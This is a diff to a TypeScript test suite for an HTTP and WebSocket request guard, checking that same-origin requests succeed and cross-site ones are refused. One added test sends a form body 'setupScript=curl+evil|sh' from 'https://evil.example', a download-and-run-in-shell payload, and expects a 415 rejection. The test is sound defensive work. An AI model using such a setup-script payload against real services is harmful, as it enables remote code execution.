@@ -1,5 +1,6 @@
 import { WebSocket } from 'ws';
 import { SESSIONS_WS_PATH } from '../sessions/sessions.gateway';
+import { waitFor } from '../sessions/testing/fake-agent';
 import {
   postJson,
   rawRequest,
@@ -16,7 +17,12 @@ describe('request guard (HTTP and WebSocket)', () => {
 
   afterEach(() => testApp.close());
 
-  const prompt = { prompt: 'Reply with pong' };
+  let projects = 0;
+  /** A valid session request; each starts its own new project. */
+  const prompt = () => ({
+    prompt: 'Reply with pong',
+    newProject: { name: `project-${++projects}` },
+  });
 
   it('serves GET requests of non-browser clients, like the health check', async () => {
     const response = await rawRequest(testApp.port, 'GET', '/api/health');
@@ -24,29 +30,29 @@ describe('request guard (HTTP and WebSocket)', () => {
   });
 
   it('accepts same-origin and allowlisted JSON POSTs and curl', async () => {
-    const sameOrigin = await postJson(testApp.port, '/api/sessions', prompt, {
+    const sameOrigin = await postJson(testApp.port, '/api/sessions', prompt(), {
       origin: `http://${testApp.host}`,
     });
     expect(sameOrigin.status).toBe(201);
-    const devServer = await postJson(testApp.port, '/api/sessions', prompt, {
+    const devServer = await postJson(testApp.port, '/api/sessions', prompt(), {
       origin: 'http://localhost:4200',
     });
     expect(devServer.status).toBe(201);
-    const curl = await postJson(testApp.port, '/api/sessions', prompt);
+    const curl = await postJson(testApp.port, '/api/sessions', prompt());
     expect(curl.status).toBe(201);
-    expect(testApp.runner.runs).toHaveLength(3);
+    await waitFor(() => testApp.runner.runs.length === 3);
   });
 
   it('refuses cross-site requests', async () => {
-    const foreign = await postJson(testApp.port, '/api/sessions', prompt, {
+    const foreign = await postJson(testApp.port, '/api/sessions', prompt(), {
       origin: 'https://evil.example',
     });
     expect(foreign.status).toBe(403);
-    const opaque = await postJson(testApp.port, '/api/sessions', prompt, {
+    const opaque = await postJson(testApp.port, '/api/sessions', prompt(), {
       origin: 'null',
     });
     expect(opaque.status).toBe(403);
-    const noOrigin = await postJson(testApp.port, '/api/sessions', prompt, {
+    const noOrigin = await postJson(testApp.port, '/api/sessions', prompt(), {
       'sec-fetch-site': 'cross-site',
     });
     expect(noOrigin.status).toBe(403);
@@ -54,6 +60,13 @@ describe('request guard (HTTP and WebSocket)', () => {
       origin: 'https://evil.example',
     });
     expect(read.status).toBe(403);
+    const repository = await postJson(
+      testApp.port,
+      '/api/repositories',
+      { cloneUrl: '/srv/acme/tool' },
+      { origin: 'https://evil.example' },
+    );
+    expect(repository.status).toBe(403);
     expect(testApp.runner.runs).toHaveLength(0);
   });
 
@@ -71,6 +84,14 @@ describe('request guard (HTTP and WebSocket)', () => {
         'prompt=Reply+with+pong',
       );
       expect(response.status).toBe(415);
+      const patch = await rawRequest(
+        testApp.port,
+        'PATCH',
+        '/api/repositories/7d0a3c2e-1b4f-4e6a-9c8d-2f1e0a9b8c7d',
+        { 'content-type': contentType },
+        'setupScript=curl+evil|sh',
+      );
+      expect(patch.status).toBe(415);
     }
     expect(testApp.runner.runs).toHaveLength(0);
   });
